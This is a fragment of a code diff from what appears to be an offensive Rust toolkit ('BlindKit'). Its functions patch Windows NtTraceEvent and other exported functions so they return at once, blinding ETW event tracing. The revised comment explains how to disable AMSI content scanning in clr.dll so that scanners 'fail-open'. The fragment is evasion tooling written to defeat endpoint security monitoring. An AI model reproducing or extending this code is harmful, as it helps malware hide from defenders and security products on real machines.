@@ -148,11 +148,11 @@ pub unsafe fn patch_nt_trace_event() -> Result<(), &'static str> {
         .ok_or("NtTraceEvent unresolved")?;
     write_patch(addr, &NTTRACE_PATCH)
 }
-
 /// Patch an arbitrary already-resolved export address with the ETW_PATCH bytes
-/// (xor rax,rax;ret → STATUS_SUCCESS). Used by the `BlindKit::Clr` path to
-/// blind `clr.dll!AmsiScanBuffer` (same content-scan surface as amsi.dll, but
-/// on the CLR which is less-watched). `addr` must point at a code page entry.
+/// (xor rax,rax;ret → STATUS_SUCCESS). Used for general ETW-alike return-0
+/// patching.  For CLR AMSI, use [`patch_clr`] instead — it returns
+/// `E_INVALIDARG` so scanners fail-open instead of reading an uninitialized
+/// result pointer.
 ///
 /// # Safety
 /// `addr` must be the entry of a patchable function (code page), in a
